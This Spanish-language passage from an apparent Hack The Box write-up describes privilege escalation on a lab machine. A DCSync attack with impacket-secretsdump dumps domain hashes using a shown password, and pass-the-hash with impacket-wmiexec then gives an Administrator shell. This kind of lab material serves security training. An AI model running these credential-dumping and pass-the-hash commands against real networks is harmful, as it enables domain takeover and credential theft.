## Privilege Escalation {-}

### Rootear la maquina {-}

Como hemos echo una buena enumeracion del systema, sabemos que el usuario **MRKLY** puede hacer un ataque DCSync para recuperar los
hashes de los usuarios del systema.

Aqui la escala de privilegio es facil y se hace desde la maquina de atacante con **SecretsDump**

```bash
impacket-secretsdump htb.local/mrlky:Football#7@10.10.10.103
```

Aqui ya vemos hashes que podemos uzar para hacer **PASS THE HASH**. Copiamos el hash del usuario Administrator y lanzamos

```bash
impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
whoami
#Output
htb\administrator
```

Ya podemos leer el **root.txt**